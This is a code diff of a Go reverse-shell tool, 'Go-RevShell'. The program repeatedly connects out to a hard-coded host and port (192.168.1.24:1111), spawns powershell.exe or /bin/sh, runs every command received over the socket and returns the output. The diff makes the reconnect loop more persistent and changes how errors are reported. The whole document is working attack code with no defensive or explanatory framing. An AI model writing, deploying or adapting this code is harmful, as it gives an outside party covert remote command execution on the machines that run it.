@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"log"
 	"net"
 	"os/exec"
 	"runtime"
@@ -21,49 +20,44 @@ const banner string = `
 `
 
 func main() {
-	connectToClient("localhost", 1111)
+	keepConnexionAlive("192.168.1.24", 1111)
 }
 
-func connectToClient(host string, port int) {
+func keepConnexionAlive(host string, port int) {
 	for {
 		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 		if err != nil {
 			time.Sleep(2 * time.Second)
-		} else {
-			connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
-			var shell string
-			switch runtime.GOOS {
-			case "windows":
-				shell = "powershell.exe"
-			default:
-				shell = "/bin/sh"
-			}
-			reverseShell(connexion, shell)
-			connexion.Close()
+			continue
 		}
+		connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
+		var shell string
+		switch runtime.GOOS {
+		case "windows":
+			shell = "powershell.exe"
+		default:
+			shell = "/bin/sh"
+		}
+		reverseShell(connexion, shell)
 	}
 }
 
 func reverseShell(connexion net.Conn, shell string) {
 	for {
 		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
-		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
-		handleError(err)
+		clientEntry, _ := bufio.NewReader(connexion).ReadString('\n')
 		clientEntry = strings.TrimSuffix(clientEntry, "\n")
 		if clientEntry == "quit" {
 			break
 		}
 		cmdOutput, err := exec.Command(shell, "-c", clientEntry).Output()
+		var log []byte
 		if err != nil {
-			connexion.Write([]byte("[-] Unknown command.\n"))
+			log = []byte("[-] Unknown command. Error : " + err.Error() + "\n")
 		} else {
-			connexion.Write(append([]byte("[+] Command sent.\n"), cmdOutput...))
+			log = []byte("[+] Command sent.\n")
 		}
+		connexion.Write(append(log, cmdOutput...))
 	}
-}
-
-func handleError(err error) {
-	if err != nil {
-		log.Fatal(err)
-	}
+	connexion.Close()
 }
